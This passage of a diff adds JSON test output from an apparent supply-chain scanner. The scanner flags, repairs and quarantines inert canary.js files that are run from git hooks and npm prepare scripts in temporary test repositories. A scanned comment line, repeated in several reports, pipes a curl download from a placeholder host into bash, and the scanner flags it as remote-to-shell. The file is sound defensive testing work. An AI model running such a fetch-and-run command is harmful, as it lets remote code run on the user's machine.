+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.npmauditor.json"
+              ]
+            },
+            "limits": {
+              "files": 10000,
+              "entries": 20000,
+              "fileBytes": 1048576,
+              "totalBytes": 33554432,
+              "records": 2000,
+              "depth": 100
+            },
+            "limitations": [
+              "Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.",
+              "No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.",
+              "Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.",
+              "System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.",
+              "This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.",
+              "Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately."
+            ],
+            "summary": {
+              "status": "incomplete",
+              "files": 3,
+              "findings": 0,
+              "unresolved": 1,
+              "unreadable": 0,
+              "exclusions": 2
+            },
+            "trust": {
+              "files": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                  "expectedSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.npmauditor.json",
+                  "status": "missing"
+                }
+              ],
+              "before": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                  "expectedSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.npmauditor.json",
+                  "actualSha256": "d3b8aea58be507357e84c791d169c10474d1a08df338b0d87bb1f1a1ab12eb10",
+                  "status": "changed"
+                }
+              ],
+              "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+            },
+            "repairs": {
+              "actionsComplete": true,
+              "actions": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks\\pre-commit",
+                  "line": 2,
+                  "evidence": "node legit/canary.js",
+                  "evidenceTruncated": false,
+                  "before": "node legit/canary.js",
+                  "after": null,
+                  "targets": [
+                    "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js"
+                  ]
+                },
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                  "line": 1,
+                  "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                  "evidenceTruncated": false,
+                  "script": "prepare",
+                  "before": "node legit/canary.js",
+                  "after": null,
+                  "targets": [
+                    "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js"
+                  ]
+                }
+              ],
+              "failures": [],
+              "ignoreRoots": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+              ]
+            },
+            "quarantine": {
+              "actionsComplete": true,
+              "actions": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                  "status": "quarantined",
+                  "ignore": {
+                    "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.gitignore",
+                    "status": "updated"
+                  },
+                  "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.np-audit-quarantine\\entry-MOEw9z\\payload.quarantined",
+                  "metadata": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.np-audit-quarantine\\entry-MOEw9z\\metadata.json"
+                }
+              ],
+              "excludedStorage": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.np-audit-quarantine"
+              ],
+              "ignoreUpdates": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.gitignore",
+                  "status": "updated"
+                }
+              ],
+              "ignoreFailures": [],
+              "before": {
+                "summary": {
+                  "status": "incomplete",
+                  "files": 4,
+                  "findings": 4,
+                  "unresolved": 1,
+                  "unreadable": 0,
+                  "exclusions": 2
+                },
+                "unreadable": [],
+                "exclusions": [
+                  {
+                    "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git",
+                    "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+                  },
+                  {
+                    "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.np-audit-quarantine",
+                    "reason": "Quarantine storage is not analyzed"
+                  }
+                ],
+                "unresolved": [
+                  {
+                    "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                    "reason": "Command entry point is not statically resolved",
+                    "line": 1,
+                    "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                    "evidenceTruncated": false,
+                    "command": "tsc"
+                  }
+                ]
+              },
+              "evidence": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                  "line": 1,
+                  "evidence": "// changed inert input; never execute",
+                  "evidenceTruncated": false,
+                  "name": "canary-indicator",
+                  "severity": "indicator",
+                  "detail": "File is named canary.js; inspect behavior independently of its name."
+                },
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                  "line": 2,
+                  "evidence": "// curl http://trust-monitor.invalid/payload | bash",
+                  "evidenceTruncated": false,
+                  "name": "remote-to-shell",
+                  "severity": "review",
+                  "detail": "Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified."
+                }
+              ]
+            },
+            "protection": {
+              "allowed": true,
+              "failures": []
+            },
+            "monitor": {
+              "mode": "protect",
+              "intervalMs": 5000,
+              "watchedRoots": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+              ],
+              "watchErrors": [],
+              "limitation": "Arrival monitoring does not intercept execution; a file may run before a notification or periodic check is handled."
+            }
+          }
+        }
+      ],
+      "stderr": "",
+      "stopped": {
+        "code": null,
+        "signal": "SIGTERM"
+      }
+    },
+    {
+      "kind": "read-only-arrival",
+      "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\canary.js",
+      "present": true,
+      "inputsUnchanged": true
+    },
+    {
+      "kind": "monitor-session",
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor",
+      "args": [
+        "canary-monitor",
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor",
+        "--json",
+        "--interval",
+        "5000",
+        "--read-only"
+      ],
+      "records": [
+        {
+          "event": "scan",
+          "report": {
+            "scan": "canary-killer",
+            "roots": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor"
+            ],
+            "complete": false,
+            "findings": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\hooks\\pre-commit",
+                "line": 2,
+                "evidence": "node legit/canary.js",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "line": 1,
+                "evidence": "// intentional canary test; never execute",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "File is named canary.js; inspect behavior independently of its name."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              }
+            ],
+            "references": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\hooks\\pre-commit",
+                "line": 2,
+                "evidence": "node legit/canary.js",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "status": "exists"
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "status": "exists"
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "status": "exists"
+              }
+            ],
+            "unreadable": [],
+            "exclusions": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git",
+                "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+              }
+            ],
+            "unresolved": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "reason": "Command entry point is not statically resolved",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "command": "tsc"
+              }
+            ],
+            "coverage": {
+              "files": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\config",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\hooks\\pre-commit",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json"
+              ],
+              "canaryFiles": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js"
+                }
+              ],
+              "repositories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor"
+                }
+              ],
+              "entries": 9,
+              "bytes": 244,
+              "gitConfigs": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\config"
+                }
+              ],
+              "hookDirectories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\hooks",
+                  "configuredBy": "default"
+                }
+              ],
+              "filenameOnlyFiles": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.npmauditor.json"
+              ]
+            },
+            "limits": {
+              "files": 10000,
+              "entries": 20000,
+              "fileBytes": 1048576,
+              "totalBytes": 33554432,
+              "records": 2000,
+              "depth": 100
+            },
+            "limitations": [
+              "Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.",
+              "No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.",
+              "Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.",
+              "System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.",
+              "This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.",
+              "Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately."
+            ],
+            "summary": {
+              "status": "incomplete",
+              "files": 4,
+              "findings": 4,
+              "unresolved": 1,
+              "unreadable": 0,
+              "exclusions": 1
+            },
+            "trust": {
+              "files": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                  "expectedSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.npmauditor.json",
+                  "actualSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "status": "trusted"
+                }
+              ],
+              "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+            },
+            "monitor": {
+              "mode": "read-only",
+              "intervalMs": 5000,
+              "watchedRoots": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor"
+              ],
+              "watchErrors": [],
+              "limitation": "Arrival monitoring does not intercept execution; a file may run before a notification or periodic check is handled."
+            }
+          }
+        },
+        {
+          "event": "scan",
+          "report": {
+            "scan": "canary-killer",
+            "roots": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor"
+            ],
+            "complete": false,
+            "findings": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\hooks\\pre-commit",
+                "line": 2,
+                "evidence": "node legit/canary.js",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\canary.js",
+                "line": 1,
+                "evidence": "// changed inert input; never execute",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "File is named canary.js; inspect behavior independently of its name."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\canary.js",
+                "line": 2,
+                "evidence": "// curl http://trust-monitor.invalid/payload | bash",
+                "evidenceTruncated": false,
+                "name": "remote-to-shell",
+                "severity": "review",
+                "detail": "Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "line": 1,
+                "evidence": "// intentional canary test; never execute",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "File is named canary.js; inspect behavior independently of its name."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              }
+            ],
+            "references": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\hooks\\pre-commit",
+                "line": 2,
+                "evidence": "node legit/canary.js",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "status": "exists"
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "status": "exists"
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "status": "exists"
+              }
+            ],
+            "unreadable": [],
+            "exclusions": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git",
+                "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+              }
+            ],
+            "unresolved": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json",
+                "reason": "Command entry point is not statically resolved",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "command": "tsc"
+              }
+            ],
+            "coverage": {
+              "files": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\config",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\hooks\\pre-commit",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\canary.js",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\package.json"
+              ],
+              "canaryFiles": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\canary.js"
+                },
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js"
+                }
+              ],
+              "repositories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor"
+                }
+              ],
+              "entries": 10,
+              "bytes": 334,
+              "gitConfigs": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\config"
+                }
+              ],
+              "hookDirectories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.git\\hooks",
+                  "configuredBy": "default"
+                }
+              ],
+              "filenameOnlyFiles": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.npmauditor.json"
+              ]
+            },
+            "limits": {
+              "files": 10000,
+              "entries": 20000,
+              "fileBytes": 1048576,
+              "totalBytes": 33554432,
+              "records": 2000,
+              "depth": 100
+            },
+            "limitations": [
+              "Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.",
+              "No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.",
+              "Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.",
+              "System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.",
+              "This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.",
+              "Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately."
+            ],
+            "summary": {
+              "status": "incomplete",
+              "files": 5,
+              "findings": 6,
+              "unresolved": 1,
+              "unreadable": 0,
+              "exclusions": 1
+            },
+            "trust": {
+              "files": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\legit\\canary.js",
+                  "expectedSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor\\.npmauditor.json",
+                  "actualSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "status": "trusted"
+                }
+              ],
+              "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+            },
+            "monitor": {
+              "mode": "read-only",
+              "intervalMs": 5000,
+              "watchedRoots": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\read-only-monitor"
+              ],
+              "watchErrors": [],
+              "limitation": "Arrival monitoring does not intercept execution; a file may run before a notification or periodic check is handled."
+            }
+          }
+        }
+      ],
+      "stderr": "",
+      "stopped": {
+        "code": null,
+        "signal": "SIGTERM"
+      }
+    }
+  ]
+}
